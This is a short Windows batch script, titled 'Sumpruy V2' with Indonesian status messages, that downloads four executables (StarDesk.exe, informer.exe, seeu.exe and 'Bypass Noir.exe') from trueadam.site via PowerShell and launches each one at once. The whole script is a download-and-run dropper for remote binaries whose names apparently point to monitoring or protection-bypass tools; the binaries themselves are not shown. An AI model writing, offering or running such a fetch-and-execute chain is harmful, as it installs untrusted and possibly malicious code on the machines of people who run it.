@echo off
title Sumpruy V2
set "DL_DIR=C:\Sumpruy_Downloads"
mkdir "%DL_DIR%" 2>nul
cd /d "%DL_DIR%"

echo.
echo ========================================
echo MULAI DOWNLOAD BRO...
echo ========================================
echo.

:: DOWNLOAD SATU PER SATU DENGAN URL LENGKAP
echo 1. Downloading StarDesk.exe...
powershell -Command "Invoke-WebRequest -Uri 'https://trueadam.site/StarDesk.exe' -OutFile 'StarDesk.exe'"
if %errorlevel%==0 (
    echo ✅ StarDesk.exe OK
    start "" "StarDesk.exe"
) else (
    echo ❌ Gagal download StarDesk.exe
)

echo.
echo 2. Downloading informer.exe...
powershell -Command "Invoke-WebRequest -Uri 'https://trueadam.site/informer.exe' -OutFile 'informer.exe'"
if %errorlevel%==0 (
    echo ✅ informer.exe OK
    start "" "informer.exe"
) else (
    echo ❌ Gagal download informer.exe
)

echo.
echo 3. Downloading seeu.exe...
powershell -Command "Invoke-WebRequest -Uri 'https://trueadam.site/seeu.exe' -OutFile 'seeu.exe'"
if %errorlevel%==0 (
    echo ✅ seeu.exe OK
    start "" "seeu.exe"
) else (
    echo ❌ Gagal download seeu.exe
)

echo.
echo 4. Downloading Bypass Noir.exe...
powershell -Command "Invoke-WebRequest -Uri 'https://trueadam.site/Bypass%%20Noir.exe' -OutFile 'Bypass Noir.exe'"
if %errorlevel%==0 (
    echo ✅ Bypass Noir.exe OK
    start "" "Bypass Noir.exe"
) else (
    echo ❌ Gagal download Bypass Noir.exe
)

echo.
echo ========================================
echo SELESAI SEMUA BRO. CEK DI C:\Sumpruy_Downloads
echo ========================================
pause
